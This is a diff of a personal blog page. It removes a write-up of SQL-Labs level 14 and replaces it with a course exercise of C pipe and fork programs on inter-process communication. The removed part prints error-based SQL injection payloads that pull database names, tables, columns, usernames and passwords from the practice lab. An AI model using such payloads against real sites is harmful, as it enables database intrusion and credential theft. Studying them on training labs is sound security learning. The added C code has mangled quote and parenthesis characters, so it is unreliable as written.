@@ -29,7 +29,7 @@
     
     <div id="post-toc" class="animated hiddenToc hide">
       <span class="title">Toc</span>
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql-labs%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5"><span class="toc-text">sql-labs通关攻略</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1"><span class="toc-text">进程通信</span></a></li></ol>
     </div>
     
     <div id="fixed-menu-wrap">
@@ -175,7 +175,7 @@
       <div class="meta">
         <span class="item">
           <span class="iconfont icon-time-circle"></span>
-          <span>2020/11/21</span>
+          <span>2020/11/22</span>
         </span>
 
         
@@ -186,7 +186,7 @@
           <span>
               
                 
-                  <a href="/categories/靶场通关">靶场通关</a>
+                  <a href="/categories/课内学习">课内学习</a>
                 
               
           </span>
@@ -199,7 +199,7 @@
             <span>
                 
                   
-                    <a href="/tags/SQL-Labs">SQL-Labs</a>
+                    <a href="/tags/OS">OS</a>
                   
                 
             </span>
@@ -209,37 +209,22 @@
       <div>
       </div>
     </div>
-    <html><head></head><body><h2 id="sql-labs通关攻略">sql-labs通关攻略<a class="post-anchor" href="#sql-labs通关攻略"></a></h2><p>首先打开界面观察一下，没有发现标志性的注入点，接下来就是在username和password里面尝试注入，输入探测语句后发现，返回的数据只有正确和错误，很明显的报错注入，接下来就是报错注入的过程了。</p>
-<p>输入</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'</span><br></pre></td></tr></tbody></table></figure>
-<p>发现报错信息中提示了有双引号，于是尝试双引号闭合，发现确实是需要闭合的。</p>
-<p>既然知道了是报错注入，就直接上代码，先找到数据库：</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select database()),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_database.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_database.png" alt></a></p>
-<p>然后是数据库中使用的表：</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select table_name from information_schema.tables where schema_talbe='security' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_table.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_table.png" alt></a></p>
-<p>接着就是表中的列</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select column_name from information_schema.columns where table_name='users' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_column.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_column.png" alt></a></p>
-<p>最后找到字段<br>username:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select username from 'users' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_username.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_username.png" alt></a><br>password:</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">" union select count(*),concat_ws((select password from 'users' limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a #</span><br></pre></td></tr></tbody></table></figure>
-<p><a href="https://diviad-nick.github.io/image/sql_14_password.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/sql_14_password.png" alt></a></p>
-<p>本题结束</p>
+    <html><head></head><body><h1 id="进程通信">进程通信<a class="post-anchor" href="#进程通信"></a></h1><p>编写一个程序，建立一个pipe，同时父进程产生一个子进程，子进程向pipe中写入一个字符串，父进程相隔5秒钟从该pipe中读出该字符串：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include<stdio.h></span><br><span class="line">main()</span><br><span class="line"> {  int x, fd[2];</span><br><span class="line">    char buf[30],s[30];</span><br><span class="line">    pipe(fd);</span><br><span class="line">    while（（x=fork()）==-1）;</span><br><span class="line">    if ( x==0)</span><br><span class="line">    { </span><br><span class="line">       sprintf(buf,”this is an example\n”);</span><br><span class="line">       printf(“child procee running! \n”);</span><br><span class="line">       write(fd[1],buf,30);               /*把buf中的字符写入管道*/</span><br><span class="line">       sleep(5);	/*睡眠5秒，让父进程读*/</span><br><span class="line">       exit(0);                        /*关闭x，子进程自我中止*/</span><br><span class="line">    }</span><br><span class="line">    else</span><br><span class="line">     {  wait(0);                      /*父进程挂起直到其某一子进程中止为止*/</span><br><span class="line">        read(fd[0],s,30);</span><br><span class="line">        printf(“%s”,s);</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure>
+<p><a href="https://diviad-nick.github.io/image/jinchengtongxin1_shili.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/jinchengtongxin1_shili.png" alt></a></p>
+<p>2.使用pipe()建立管道线，同时父进程生成两个子进程，分别在这条管道上写“child1 is sending a message!”   “child2 is sending a message!” ,然后父进程从管道中读出信息，显示在屏幕上。（使用lockf让子进程之间互斥）</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#include <unistd.h></span><br><span class="line">#include <signal.h></span><br><span class="line">#include <stdio.h></span><br><span class="line">#include<string.h></span><br><span class="line">int pid1,pid2;</span><br><span class="line"> </span><br><span class="line">main( )</span><br><span class="line">{ </span><br><span class="line">int fd[2];</span><br><span class="line">char outpipe[100],inpipe[100];</span><br><span class="line">pipe(fd);                       /*创建一个管道*/</span><br><span class="line">while ((pid1=fork( ))==-1);</span><br><span class="line">/*lockf()函数允许将文件区域用作信号量（监视锁），或用于控制对锁定进程的访问（强制模式记录锁定）。试图访问已锁定资源的其他进程将返回错误或进入休眠状态，直到资源解除锁定为止。当关闭文件时，将释放进程的所有锁定，即使进程仍然有打开的文件。当进程终止时，将释放进程保留的所有锁定。*/</span><br><span class="line">if(pid1==0)</span><br><span class="line">  {</span><br><span class="line">        lockf(fd[1],1,0);</span><br><span class="line">        sprintf(outpipe,"child 1 process is sending message!"); </span><br><span class="line">	    /*把串放入数组outpipe中*/</span><br><span class="line">        write(fd[1],outpipe,50);     /*向管道写长为50字节的串*/</span><br><span class="line">        sleep(5);                 /*自我阻塞5秒*/</span><br><span class="line">        lockf(fd[1],0,0);</span><br><span class="line">        exit(0);</span><br><span class="line">   }</span><br><span class="line">else</span><br><span class="line">  {</span><br><span class="line">    while((pid2=fork( ))==-1);</span><br><span class="line">    if(pid2==0)</span><br><span class="line">    {    </span><br><span class="line">        lockf(fd[1],1,0);           /*互斥*/</span><br><span class="line">        sprintf(outpipe,"child 2 process is sending message!");</span><br><span class="line">        write(fd[1],outpipe,50);</span><br><span class="line">        sleep(5);</span><br><span class="line">        lockf(fd[1],0,0);</span><br><span class="line">        exit(0);</span><br><span class="line">     }</span><br><span class="line">    else</span><br><span class="line">    {  </span><br><span class="line">        wait(0);              /*同步*/</span><br><span class="line">        read(fd[0],inpipe,50);   /*从管道中读长为50字节的串*/</span><br><span class="line">        printf("%s\n",inpipe);</span><br><span class="line">        wait(0);</span><br><span class="line">        read(fd[0],inpipe,50);</span><br><span class="line">        printf("%s\n",inpipe);</span><br><span class="line">        exit(0);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p><a href="https://diviad-nick.github.io/image/jinchengtongxin2.png" data-caption data-fancybox="images"><img src="https://diviad-nick.github.io/image/jinchengtongxin2.png" alt></a></p>
 </body></html>
 
   
   <div class="post-guide">
     <div class="item left">
         
-          <a href="/2020/11/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/">SQL-Labs -14</a>
-        
     </div>
     <div class="item right">
         
-          <a href="/2020/11/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%20Knife1/">极客大挑战 Knife</a>
+          <a href="/2020/11/21/sql-14/">SQL-Labs -14</a>
         
     </div>
   </div>
@@ -251,7 +236,7 @@
       本文作者：<a href="http://Diviad-Nick.github.io">Reteja</a>
     </div>
     <div class="link">
-      永久链接：<a href="http://Diviad-Nick.github.io/2020/11/21/sql-14/">http://Diviad-Nick.github.io/2020/11/21/sql-14/</a>
+      永久链接：<a href="http://Diviad-Nick.github.io/2020/11/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/">http://Diviad-Nick.github.io/2020/11/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C/</a>
     </div>
     <div class="declare">
       版权声明：本文首发于<a href="http://Diviad-Nick.github.io">Reteja</a>的博客，转载请注明出处！
